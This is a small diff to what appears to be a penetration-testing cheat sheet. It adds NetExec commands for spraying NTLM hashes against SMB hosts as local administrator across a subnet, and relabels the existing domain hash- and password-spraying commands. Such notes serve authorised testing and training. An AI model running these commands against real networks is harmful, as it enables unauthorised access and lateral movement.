@@ -5,10 +5,12 @@
 <summary>Credentials Spraying (hashes/passwords)</summary>
 
 ```bash
-# Spray Hashes
+# Spray Hashes for Domain
 nxc smb target.txt -u user.txt -H hashes.txt --continue-on-success
+# Spray Hashes for Local Admin
+nxc smb 172.16.150.0/24 -u administrator -H ed24.. --local-auth
 
-# Spray Passwords
+# Spray Passwords for Domain
 nxc smb target.txt -u user.txt -p passwords.txt --continue-on-success
 ```
 
